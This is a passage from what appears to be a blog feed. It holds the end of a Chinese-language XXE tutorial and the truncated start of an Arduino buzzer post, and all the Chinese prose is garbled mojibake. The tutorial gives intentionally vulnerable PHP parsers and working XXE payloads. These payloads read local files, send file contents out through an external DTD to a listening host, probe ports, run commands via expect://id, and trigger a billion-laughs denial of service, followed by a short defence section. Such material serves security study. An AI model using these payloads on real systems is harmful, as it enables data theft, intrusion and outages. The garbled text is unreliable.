ã€‚</p></li><li><p>å¦‚æœå¯ä»¥å¼•ç”¨å¤–éƒ¨å®ä½“,åˆ™å­˜åœ¨xxeæ¼æ´</p></li></ol><h1 id="XXEåˆ©ç”¨"><a href="#XXEåˆ©ç”¨" class="headerlink" title="XXEåˆ©ç”¨"></a>XXEåˆ©ç”¨</h1><h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h2><ol><li>æœ‰å›æ˜¾çš„æƒ…å†µå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°Payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡(å¸¦å†…XMLå¤–éƒ¨å®ä½“(XXE),å³æ”»å‡»è€…å¯ä»¥å‘é€å¸¦æœ‰XXEæœ‰æ•ˆè´Ÿè½½çš„è¯·æ±‚å¹¶ä»åŒ…å«æŸäº›æ•°æ®çš„Webåº”ç”¨ç¨‹åºè·å–å“åº”)</li></ol><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;xxe&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./xml.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line"><span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>è¯»å–æœ¬åœ°æ–‡ä»¶</strong></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411175855619.png" alt="image-20210411175855619"></p><p>ä½†æ˜¯ï¼Œå½“æ‰€è¯»å–æ–‡ä»¶ä¸­åŒ…å«äº†<code>&lt;</code>æˆ–è€…<code>&amp;</code>ç­‰ä¸€äº›ç‰¹æ®Šç¬¦å·æ—¶ï¼Œä¼šå‘ç°çˆ†äº†ä¸€å †é”™è€Œä¸”è¯»å–ä¸åˆ°è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411180142451.png" alt="image-20210411180142451"></p><p>åŸå› æ˜¯xmlä¼šæŠŠ<code>&lt;</code>ç­‰ç‰¹æ®Šå­—ç¬¦è§£æå¯¼è‡´é”™è¯¯ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰çš„<code>CDATA</code> å’Œå‚æ•°å®ä½“æ¥ç»•è¿‡ã€‚</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411221956406.png" alt="image-20210411221956406"></p><p>æ­¤å¤–ï¼Œé’ˆå¯¹è¯»å–æ–‡ä»¶ä¸­å«ç‰¹æ®Šå­—ç¬¦çš„æƒ…å†µå¹¶ä¸”è¯¥ç½‘ç«™æ˜¯phpè¯­è¨€ç¼–å†™çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpçš„ä¸€äº›ä¼ªåè®®è¿›è¡Œè¯»å–ã€‚</p><p>ç”¨åˆ°çš„ä¼ªåè®®ï¼š</p><blockquote><p>php://filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚</p></blockquote><p>å®é™…åˆ©ç”¨ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=D:/test.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222122278.png" alt="image-20210411222122278"></p><p>base64è§£ç åå¾—åˆ°test.txtä¸­çš„å†…å®¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222200953.png" alt="image-20210411222200953"></p><ol start="2"><li>åœ¨å®é™…æƒ…å†µä¸­ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹æœåŠ¡å™¨ä¸Šçš„XMLå¹¶ä¸æ˜¯è¾“å‡ºç”¨çš„ï¼Œæ‰€ä»¥å°±å°‘äº†è¾“å‡ºè¿™ä¸€ç¯èŠ‚ï¼Œè¿™æ ·çš„è¯ï¼Œå³ä½¿æ¼æ´å­˜åœ¨ï¼Œæˆ‘ä»¬çš„payloadçš„ä¹Ÿè¢«è§£æäº†ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰è¾“å‡ºï¼Œæˆ‘ä»¬ä¹Ÿä¸çŸ¥é“è§£æå¾—åˆ°çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå› æ­¤æˆ‘ä»¬æƒ³è¦ç°å®ä¸­åˆ©ç”¨è¿™ä¸ªæ¼æ´å°±å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªä¸ä¾é å…¶å›æ˜¾çš„æ–¹æ³•â€”â€”å¤–å¸¦æ•°æ®ã€‚</li></ol><p>é€”å¾„ï¼šé€šè¿‡å¤–éƒ¨DTDçš„æ–¹å¼å¯ä»¥å°†å†…éƒ¨å‚æ•°å®ä½“çš„å†…å®¹ä¸å¤–éƒ¨DTDå£°æ˜çš„å®ä½“çš„å†…å®¹æ‹¼æ¥èµ·æ¥ã€‚<br>åˆ©ç”¨payloadæ¥ä»ç›®æ ‡ä¸»æœºè¯»å–åˆ°æ–‡ä»¶å†…å®¹åï¼Œå°†æ–‡ä»¶å†…å®¹ä½œä¸ºurlçš„ä¸€éƒ¨åˆ†æ¥è¯·æ±‚æˆ‘ä»¬æœ¬åœ°ç›‘å¬çš„ç«¯å£ã€‚</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.232.128/a.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>a.dtdæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.232.128&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœåŠ¡å™¨æ—¥å¿—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail /var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235840135.png" alt="image-20210411235840135"></p><p>åŒæ ·ï¼Œbase64è§£ç å¾—test.txtçš„å†…å®¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235716386.png" alt="image-20210411235716386"></p><h2 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h2><p>å› ä¸ºæˆ‘ä»¬çš„XMLåœ¨å¼•ç”¨å¤–éƒ¨DTDå’Œå¤–éƒ¨å®ä½“çš„æ—¶å€™æ”¯æŒhttpåè®®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹è¿›è¡Œç«¯å£æ¢æµ‹ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//ç¦ç”¨/å¯ç”¨åŠ è½½å¤–éƒ¨å®ä½“çš„åŠŸèƒ½</span></span><br><span class="line">    libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1:80&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ˜¯è¯·æ±‚å¼€æ”¾çš„ç«¯å£ï¼Œè¯·æ±‚æ—¶é—´è¾ƒçŸ­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223616203.png" alt="image-20210413223616203"></p><p>è€Œå¦‚æœè¯·æ±‚çš„æ˜¯æœªå¼€æ”¾çš„ç«¯å£ï¼Œåˆ™è¯·æ±‚æ—¶é—´æ˜æ˜¾åŠ é•¿!</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223716363.png" alt="image-20210413223716363"></p><p>è¿›ä¸€æ­¥å¯åˆ©ç”¨burpsuiteçš„çˆ†ç ´æ¨¡å—(Intruder)å¯¹æ‰€åœ¨ç½‘æ®µè¿›è¡Œç«¯å£æ¢æµ‹ã€‚</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><p>å½“ç›®æ ‡æœºå™¨å®‰è£…å¹¶åŠ è½½äº†PHPçš„expectæ‰©å±•,å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤.(ç”±äºè¿™ä¸ªæ‰©å±•ä¸æ˜¯é»˜è®¤å®‰è£…çš„,æ‰€ä»¥å¾ˆå°‘ç¢°åˆ°!)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [ <span class="meta">&lt;!ELEMENT  <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DOSæ”»å‡»"><a href="#DOSæ”»å‡»" class="headerlink" title="DOSæ”»å‡»"></a>DOSæ”»å‡»</h2><p>åœ¨å®éªŒçš„è¿‡ç¨‹ä¸­å‘ç°,å•ç‹¬ä¸€ä¸ªæ•°æ®åŒ…å¹¶ä¸æ˜æ˜¾,å¯ä»¥ç»“åˆburpsuiteçš„çˆ†ç ´æ¨¡å—ä½¿ç”¨!(å®é™…æµ‹è¯•åˆ‡è®°ä¸è¦å°è¯•)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXEé˜²å¾¡"><a href="#XXEé˜²å¾¡" class="headerlink" title="XXEé˜²å¾¡"></a>XXEé˜²å¾¡</h1><ol><li><p>ç¦ç”¨å¤–éƒ¨å®ä½“åº”ç”¨ </p><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>JAVA</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></li><li><p>é»‘åå•è¿‡æ»¤</p></li></ol><p>å»ºç«‹é»‘åå•ï¼Œå¦‚&lt;ã€DOCTYPEã€ENTITYã€SYSTEMã€PUBLICç­‰å­—ç¬¦ï¼Œè¿‡æ»¤æ‰ç”¨æˆ·è¾“å…¥çš„æ•æ„Ÿè¯ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://xz.aliyun.com/t/3357#toc-11">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p><p>[2] <a href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#xxe%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">XXEæ¼æ´å­¦ä¹ </a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduinoè‡´å¬ä½“éªŒ</title>
      <link href="posts/64177.html"/>
      <url>posts/64177.html</url>
      
        <content type="html"><![CDATA[<div class="note red icon simple"><i class="note-icon fas fa-bullhorn"></i><p>ä¸Šæ¬¡Arduinoå°è½¦æ— æœè€Œç»ˆä¹‹åï¼Œå†³å®šæ•´ç‚¹å¥½ç©çš„ã€‚æ²¡é”™ï¼Œå®ƒæ¥äº†ï¼Œå®ƒæ¥äº†ï¼Œèœ‚é¸£å™¨å¸¦ç€å®ƒ<del>å¥½å¬</del>çš„éŸ³ä¹èµ°æ¥äº†ã€‚</p></div><h1 id="æ‰€ç”¨ææ–™"><a href="#æ‰€ç”¨ææ–™" class="headerlink" title="æ‰€ç”¨ææ–™"></a>æ‰€ç”¨ææ–™</h1><ol><li>Adruino unoä¸€å—</li><li>é¢åŒ…æ¿ä¸€ä¸ª</li><li>æ— æºèœ‚é¸£å™¨ä¸€ä¸ª</li><li>æœé‚¦çº¿è‹¥å¹²</li></ol><h1 id="ç¡¬ä»¶æ¥çº¿"><a href="#ç¡¬ä»¶æ¥çº¿" class="headerlink" title="ç¡¬ä»¶æ¥çº¿"></a>ç¡¬ä»¶æ¥çº¿</h1><table><thead><tr><th align="center">arduino</th><th align="center">èœ‚é¸£å™¨</th></tr></thead><tbody><tr><td align="center">5V</td><td align="center">VCC</td></tr><tr><td align="center">GND</td><td align="center">GND</td></tr><tr><td align="center">8</td><td align="center">I/O</td></tr></tbody></table><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210403160903354.png" alt="image-20210403160903354"></p><h1 id="å‘å‡ºå£°éŸ³"><a href="#å‘å‡ºå£°éŸ³" class="headerlink" title="å‘å‡ºå£°éŸ³"></a>å‘å‡ºå£°éŸ³</h1><p>å‰é¢æˆ‘ä»¬å·²ç»æŠŠæ•°å­—IOè¿æ¥åˆ°äº†èœ‚é¸£å™¨çš„æ­£æï¼Œè®©èœ‚é¸£å™¨å“èµ·æ¥åªéœ€è¦åœ¨æ•°å­—IOä¸Šæ”¾å…¥æ–¹æ³¢å³å¯ã€‚</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">HIGH</span>); <span class="comment">//é«˜ç”µå¹³</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">LOW</span>);  <span class="comment">//ä½ç”µå¹³</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„100æŒ‡çš„æ˜¯å‘å£°åå»¶æ—¶100ms</p><h1 id="å”±å‡ºæ—‹å¾‹"><a href="#å”±å‡ºæ—‹å¾‹" class="headerlink" title="å”±å‡ºæ—‹å¾‹"></a>å”±å‡ºæ—‹å¾‹</h1><p>å¦‚æœåªæ˜¯å‘å‡ºå“å£°çš„è¯ï¼Œé‚£ä¹Ÿå¤ªé¸¡è‚‹äº†å§ï¼Ÿå¦‚æœè¦å‘å‡ºç²¾ç¡®çš„ä¸åŒé¢‘ç‡çš„ä¹éŸ³æ€ä¹ˆåŠï¼Ÿéš¾é“è¿˜è¦ç®—ï¼Ÿï¼ˆä¸‹é¢æ˜¯ä¸€å¼ ä¹éŸ³é¢‘ç‡å›¾ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMTA3MjE1ODQ2NzU5" alt="éŸ³ç¬¦è¡¨"></p><p>ç®—æ˜¯ä¸å¯èƒ½å•¦ï¼Œè¿™é‡Œç›´æ¥æŠŠå¤§ä½¬ä»¬â€œç¿»è¯‘â€å¥½çš„ä»£ç æ¬äº†è¿‡æ¥ï¼Œæ„Ÿè°¢åˆ†äº«ï¼ä¸‹é¢ä¸‰é¦–â€œæ­Œæ›²â€å¯ä»¥è¯•ç€å¬ä¸€ä¸‹~</p><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">è‘«èŠ¦å¨ƒ</button></li><li class="tab"><button type="button" data-href="#-2">åƒæœ¬æ¨±</button></li><li class="tab"><button type="button" data-href="#-3">çˆ±æ‹¼æ‰ä¼šèµ¢</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E8%91%AB%E8%8A%A6%E5%A8%83.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 